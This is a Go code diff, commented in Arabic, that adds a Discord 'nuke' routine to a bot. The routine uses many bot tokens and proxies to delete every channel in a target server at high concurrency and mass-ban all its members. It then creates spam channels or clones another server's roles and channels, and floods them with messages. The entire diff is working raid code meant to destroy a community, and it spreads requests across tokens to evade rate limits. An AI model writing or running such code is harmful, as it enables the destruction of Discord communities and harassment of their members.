@@ -323,4 +323,268 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 
 	// 1. حذف الرومات القديمة
 	chQueue := make(chan string, len(oldChannelIDs))
-	for _, id := range old
+	for _, id := range oldChannelIDs {
+		chQueue <- id
+	}
+	close(chQueue)
+
+	var wgDel sync.WaitGroup
+	for w := 0; w < 60; w++ {
+		wgDel.Add(1)
+		go func(workerID int) {
+			defer wgDel.Done()
+			for chID := range chQueue {
+				makeMegaRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
+			}
+		}(w)
+	}
+	wgDel.Wait()
+
+	// 2. باند الأعضاء بأقصى سرعة
+	if len(allUserIDs) > 0 {
+		userQueue := make(chan string, len(allUserIDs))
+		for _, uid := range allUserIDs {
+			userQueue <- uid
+		}
+		close(userQueue)
+
+		var wgBan sync.WaitGroup
+		banWorkers := 100
+		for w := 0; w < banWorkers; w++ {
+			wgBan.Add(1)
+			go func(workerID int) {
+				defer wgBan.Done()
+				for uid := range userQueue {
+					banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
+					makeMegaRequest("PUT", banURL, nil, workerID)
+				}
+			}(w)
+		}
+		wgBan.Wait()
+	}
+
+	// 3. بناء الرومات (سواء نسخ من سيرفر آخر أو إنشاء رومات عادية)
+	var newChannelIDs []string
+
+	if templateGuildID != "" {
+		newChannelIDs = cloneServerStructure(templateGuildID, guildID, tokens, clients, s)
+	} else {
+		channelPayloads := make([][]byte, roomsCount)
+		for i := 0; i < roomsCount; i++ {
+			p, _ := json.Marshal(map[string]interface{}{
+				"name": fmt.Sprintf("%s-%d", roomName, i),
+				"type": 0,
+			})
+			channelPayloads[i] = p
+		}
+
+		roomChan := make(chan struct {
+			Payload []byte
+			Index   int
+		}, len(channelPayloads))
+
+		for idx, p := range channelPayloads {
+			roomChan <- struct {
+				Payload []byte
+				Index   int
+			}{p, idx}
+		}
+		close(roomChan)
+
+		var muChannels sync.Mutex
+		var wgCreate sync.WaitGroup
+
+		for w := 0; w < 50; w++ {
+			wgCreate.Add(1)
+			go func(workerID int) {
+				defer wgCreate.Done()
+				client := clients[workerID%len(clients)]
+				token := tokens[workerID%len(tokens)]
+
+				for item := range roomChan {
+					req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(item.Payload))
+					req.Header.Set("Authorization", "Bot "+token)
+					req.Header.Set("Content-Type", "application/json")
+					req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
+
+					resp, err := client.Do(req)
+					if err != nil {
+						continue
+					}
+
+					if resp.StatusCode == 200 || resp.StatusCode == 201 {
+						var chResult map[string]interface{}
+						if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
+							if chID, ok := chResult["id"].(string); ok {
+								muChannels.Lock()
+								newChannelIDs = append(newChannelIDs, chID)
+								muChannels.Unlock()
+							}
+						}
+					}
+					resp.Body.Close()
+				}
+			}(w)
+		}
+		wgCreate.Wait()
+	}
+
+	// 4. إرسال الرسائل
+	if len(newChannelIDs) > 0 && messagesCount > 0 {
+		var wgMsg sync.WaitGroup
+		for i, chID := range newChannelIDs {
+			wgMsg.Add(1)
+			go func(channelID string, workerIndex int) {
+				defer wgMsg.Done()
+				for m := 0; m < messagesCount; m++ {
+					success := makeMegaRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/messages", msgPayload, workerIndex+m)
+					if !success {
+						time.Sleep(10 * time.Millisecond)
+					}
+				}
+			}(chID, i)
+		}
+		wgMsg.Wait()
+	}
+}
+
+// دالة نسخ الرتب والرومات من السيرفر المصدر إلى السيرفر المستهدف
+func cloneServerStructure(templateGuildID, targetGuildID string, tokens []string, clients []*http.Client, s *discordgo.Session) []string {
+	var createdChannelIDs []string
+
+	// 1. نسخ الرتب أولاً
+	templateRoles, err := s.GuildRoles(templateGuildID)
+	if err == nil {
+		sort.Slice(templateRoles, func(i, j int) bool {
+			return templateRoles[i].Position > templateRoles[j].Position
+		})
+
+		for _, r := range templateRoles {
+			if r.Name == "@everyone" || r.Managed {
+				continue
+			}
+			rolePayload, _ := json.Marshal(map[string]interface{}{
+				"name":        r.Name,
+				"permissions": r.Permissions,
+				"color":       r.Color,
+				"hoist":       r.Hoist,
+				"mentionable": r.Mentionable,
+			})
+
+			for idx, t := range tokens {
+				client := clients[idx%len(clients)]
+				req, _ := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", targetGuildID), bytes.NewBuffer(rolePayload))
+				req.Header.Set("Authorization", "Bot "+t)
+				req.Header.Set("Content-Type", "application/json")
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+					if resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode != 429 {
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// 2. نسخ الكاتيجوري والرومات
+	templateChannels, err := s.GuildChannels(templateGuildID)
+	if err != nil {
+		return createdChannelIDs
+	}
+
+	var categories []*discordgo.Channel
+	var regularChannels []*discordgo.Channel
+
+	for _, ch := range templateChannels {
+		if ch.Type == discordgo.ChannelTypeGuildCategory {
+			categories = append(categories, ch)
+		} else if ch.Type == discordgo.ChannelTypeGuildText || ch.Type == discordgo.ChannelTypeGuildVoice {
+			regularChannels = append(regularChannels, ch)
+		}
+	}
+
+	categoryMap := make(map[string]string)
+
+	for _, cat := range categories {
+		payload, _ := json.Marshal(map[string]interface{}{
+			"name":     cat.Name,
+			"type":     cat.Type,
+			"position": cat.Position,
+		})
+
+		for idx, t := range tokens {
+			client := clients[idx%len(clients)]
+			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+targetGuildID+"/channels", bytes.NewBuffer(payload))
+			req.Header.Set("Authorization", "Bot "+t)
+			req.Header.Set("Content-Type", "application/json")
+			resp, err := client.Do(req)
+			if err == nil {
+				if resp.StatusCode == 200 || resp.StatusCode == 201 {
+					var res map[string]interface{}
+					if json.NewDecoder(resp.Body).Decode(&res) == nil {
+						if newID, ok := res["id"].(string); ok {
+							categoryMap[cat.ID] = newID
+						}
+					}
+					resp.Body.Close()
+					break
+				}
+				resp.Body.Close()
+			}
+		}
+	}
+
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	for _, ch := range regularChannels {
+		wg.Add(1)
+		go func(c *discordgo.Channel) {
+			defer wg.Done()
+
+			data := map[string]interface{}{
+				"name":                c.Name,
+				"type":                c.Type,
+				"topic":               c.Topic,
+				"nsfw":                c.NSFW,
+				"rate_limit_per_user": c.RateLimitPerUser,
+				"position":            c.Position,
+			}
+
+			if c.ParentID != "" {
+				if newParentID, exists := categoryMap[c.ParentID]; exists {
+					data["parent_id"] = newParentID
+				}
+			}
+
+			payload, _ := json.Marshal(data)
+
+			for idx, t := range tokens {
+				client := clients[idx%len(clients)]
+				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+targetGuildID+"/channels", bytes.NewBuffer(payload))
+				req.Header.Set("Authorization", "Bot "+t)
+				req.Header.Set("Content-Type", "application/json")
+				resp, err := client.Do(req)
+				if err == nil {
+					if resp.StatusCode == 200 || resp.StatusCode == 201 {
+						var res map[string]interface{}
+						if json.NewDecoder(resp.Body).Decode(&res) == nil {
+							if newID, ok := res["id"].(string); ok {
+								mu.Lock()
+								createdChannelIDs = append(createdChannelIDs, newID)
+								mu.Unlock()
+							}
+						}
+						resp.Body.Close()
+						break
+					}
+					resp.Body.Close()
+				}
+			}
+		}(ch)
+	}
+	wg.Wait()
+
+	return createdChannelIDs
+}
